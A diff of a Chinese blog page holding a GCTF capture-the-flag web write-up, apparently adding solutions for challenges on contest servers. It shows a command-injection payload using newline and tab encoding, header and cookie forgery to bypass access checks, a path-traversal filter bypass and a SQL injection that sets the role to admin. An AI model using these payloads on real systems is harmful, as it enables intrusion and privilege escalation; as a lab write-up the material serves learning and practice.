@@ -102,6 +102,7 @@
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/7.jpg?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/8.jpg?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/9.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170624/1.jpg?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/2.jpg?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/1.jpg?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/5.jpg?raw=true">
@@ -110,7 +111,7 @@
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/8.jpg?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/10.jpg?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/9.jpg?raw=true">
-<meta property="og:updated_time" content="2017-06-22T08:04:57.717Z">
+<meta property="og:updated_time" content="2017-06-24T11:59:36.964Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="GCTF-web-writeup">
 <meta name="twitter:description" content="GCTF-web-writeup">
@@ -463,11 +464,29 @@
 <p><code>...//fl./ag.php</code>中，<code>./</code>被过滤后会变成<code>../flag.php</code>，这样就能成功读取了。</p>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/9.jpg?raw=true" alt=""></p>
 <p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;drthSDFSDGFSdsfhfg&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="web综合"><a href="#web综合" class="headerlink" title="web综合"></a>web综合</h1><p>题目地址：<a href="http://218.2.197.232:18007/" target="_blank" rel="external">http://218.2.197.232:18007/</a></p>
-<h1 id="变态验证码"><a href="#变态验证码" class="headerlink" title="变态验证码"></a>变态验证码</h1><p>题目地址： <a href="http://218.2.197.232:18003/" target="_blank" rel="external">http://218.2.197.232:18003/</a></p>
-<h1 id="Java序列化"><a href="#Java序列化" class="headerlink" title="Java序列化"></a>Java序列化</h1><p>题目地址： <a href="http://218.2.197.232:18005/ctfobj/" target="_blank" rel="external">http://218.2.197.232:18005/ctfobj/</a></p>
-<h1 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h1><p>题目地址：<a href="http://218.2.197.232:18006/" target="_blank" rel="external">http://218.2.197.232:18006/</a></p>
+<h1 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h1><p>题目地址：<a href="http://218.2.197.232:18006/" target="_blank" rel="external">http://218.2.197.232:18006/</a><br>有点类似“春秋杯”的web。<br>构造如下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18006/</div><div class="line">?cmd=%0acat%09</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170624/1.jpg?raw=true" alt=""></p>
 <h1 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h1><p>题目地址：<a href="http://218.2.197.232:18002/" target="_blank" rel="external">http://218.2.197.232:18002/</a></p>
+<p>访问得到forbidden，但返回头为200，所以是个人为写的页面。查看源代码下拉得到提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--只允许本机访问。 --&gt;</div></pre></td></tr></table></figure></p>
+<p>在请求包中添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">X-Forwarded-For:localhost</div></pre></td></tr></table></figure></p>
+<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--只能通过域名访问 --&gt;</div></pre></td></tr></table></figure></p>
+<p>在请求包中继续添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Host:www.topsec.com</div></pre></td></tr></table></figure></p>
+<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--只允许从百度跳转到本页面访问。 --&gt;</div></pre></td></tr></table></figure></p>
+<p>在请求包中继续添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Referer:www.baidu.com</div></pre></td></tr></table></figure></p>
+<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--只允许使用ajax访问本页面 --&gt;</div></pre></td></tr></table></figure></p>
+<p>在请求包中继续添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">X-Requested-With:XMLHttpRequest</div></pre></td></tr></table></figure></p>
+<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--本站只允许使用IE4访问 --&gt;</div></pre></td></tr></table></figure></p>
+<p>在网上查一查，将userAgent修改如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98)</div></pre></td></tr></table></figure></p>
+<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--电脑上必须安装有.NET8 --&gt;</div></pre></td></tr></table></figure></p>
+<p>修改userAgent如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98;.NET CLR 8.0.50727)</div></pre></td></tr></table></figure></p>
+<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--本站只允许德国用户访问。 --&gt;</div></pre></td></tr></table></figure></p>
+<p>修改userAgent如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Accept-Language: de-DE</div></pre></td></tr></table></figure></p>
+<p>得到下一个提示；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--没有登录！ --&gt;</div></pre></td></tr></table></figure></p>
+<p>同时返回头中出现了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-Cookie: login=4e6a59324d545a6a4e7a4d324e513d3d</div></pre></td></tr></table></figure></p>
+<p>探索如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">4e6a59324d545a6a4e7a4d324e513d3d是十六进制编码，</div><div class="line">解码得到： NjY2MTZjNzM2NQ== 猜测是base64加密，</div><div class="line">解码得到： 66616c7365 猜测是十六进制编码，</div><div class="line">解码得到： false</div></pre></td></tr></table></figure></p>
+<p>要成功登陆，则login=true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">true 进行十六进制编码，得到：74727565</div><div class="line">再base64编码，得到：NzQ3Mjc1NjU=</div><div class="line">再十六进制编码，得到：4e7a51334d6a63314e6a553d</div></pre></td></tr></table></figure></p>
+<p>在请求包中增加Cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Cookie:login=4e7a51334d6a63314e6a553d</div></pre></td></tr></table></figure></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;Dt24FbREwYJu7P8ekQHEFknK&#125;</div></pre></td></tr></table></figure></p>
 <h1 id="越权注入"><a href="#越权注入" class="headerlink" title="越权注入"></a>越权注入</h1><p>题目地址：<a href="http://218.2.197.232:18014/" target="_blank" rel="external">http://218.2.197.232:18014/</a></p>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/2.jpg?raw=true" alt=""></p>
 <p>查看源代码，得到提示，同时可以知道uid默认为500 ：</p>
@@ -486,6 +505,9 @@
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/9.jpg?raw=true" alt=""></p>
 <p>猜测为update型注入，因为引号被过滤了，所以对admin进行一次hex编码，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.....birth=11111111&amp;gender=&amp;uid=0,role=0x61646d696e</div></pre></td></tr></table></figure></p>
 <p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;9CtyJLHMxkjLUs6qfUM5Cmrb&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="web综合"><a href="#web综合" class="headerlink" title="web综合"></a>web综合</h1><p>题目地址：<a href="http://218.2.197.232:18007/" target="_blank" rel="external">http://218.2.197.232:18007/</a></p>
+<h1 id="变态验证码"><a href="#变态验证码" class="headerlink" title="变态验证码"></a>变态验证码</h1><p>题目地址： <a href="http://218.2.197.232:18003/" target="_blank" rel="external">http://218.2.197.232:18003/</a></p>
+<h1 id="Java序列化"><a href="#Java序列化" class="headerlink" title="Java序列化"></a>Java序列化</h1><p>题目地址： <a href="http://218.2.197.232:18005/ctfobj/" target="_blank" rel="external">http://218.2.197.232:18005/ctfobj/</a></p>
 
       
     </div>
@@ -501,7 +523,7 @@
   <p><span>本文标题:</span><a href="/2017/06/19/GCTF-web-writeup/">GCTF-web-writeup</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
   <p><span>发布时间:</span>2017年06月19日 - 08:06</p>
-  <p><span>最后更新:</span>2017年06月22日 - 16:06</p>
+  <p><span>最后更新:</span>2017年06月24日 - 19:06</p>
   <p><span>原始链接:</span><a href="/2017/06/19/GCTF-web-writeup/" title="GCTF-web-writeup">http://yoursite.com/2017/06/19/GCTF-web-writeup/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/06/19/GCTF-web-writeup/"  aria-label="复制成功！"></i></span>
   </p>
@@ -583,8 +605,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/06/22/Google-CTF-2017-web-writeup/" rel="prev" title="Google CTF 2017-web-writeup">
-                Google CTF 2017-web-writeup <i class="fa fa-chevron-right"></i>
+              <a href="/2017/06/22/浅谈php伪协议及在CTF比赛中的应用/" rel="prev" title="浅谈php伪协议及在CTF比赛中的应用">
+                浅谈php伪协议及在CTF比赛中的应用 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -750,7 +772,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#热身题"><span class="nav-number">1.</span> <span class="nav-text">热身题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#springcss"><span class="nav-number">2.</span> <span class="nav-text">springcss</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP序列化"><span class="nav-number">3.</span> <span class="nav-text">PHP序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#条件竞争"><span class="nav-number">4.</span> <span class="nav-text">条件竞争</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#读文件"><span class="nav-number">5.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web综合"><span class="nav-number">6.</span> <span class="nav-text">web综合</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#变态验证码"><span class="nav-number">7.</span> <span class="nav-text">变态验证码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java序列化"><span class="nav-number">8.</span> <span class="nav-text">Java序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RCE绕过"><span class="nav-number">9.</span> <span class="nav-text">RCE绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Forbidden"><span class="nav-number">10.</span> <span class="nav-text">Forbidden</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#越权注入"><span class="nav-number">11.</span> <span class="nav-text">越权注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#热身题"><span class="nav-number">1.</span> <span class="nav-text">热身题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#springcss"><span class="nav-number">2.</span> <span class="nav-text">springcss</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP序列化"><span class="nav-number">3.</span> <span class="nav-text">PHP序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#条件竞争"><span class="nav-number">4.</span> <span class="nav-text">条件竞争</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#读文件"><span class="nav-number">5.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RCE绕过"><span class="nav-number">6.</span> <span class="nav-text">RCE绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Forbidden"><span class="nav-number">7.</span> <span class="nav-text">Forbidden</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#越权注入"><span class="nav-number">8.</span> <span class="nav-text">越权注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web综合"><span class="nav-number">9.</span> <span class="nav-text">web综合</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#变态验证码"><span class="nav-number">10.</span> <span class="nav-text">变态验证码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java序列化"><span class="nav-number">11.</span> <span class="nav-text">Java序列化</span></a></li></ol></div>
             
 
           </div>
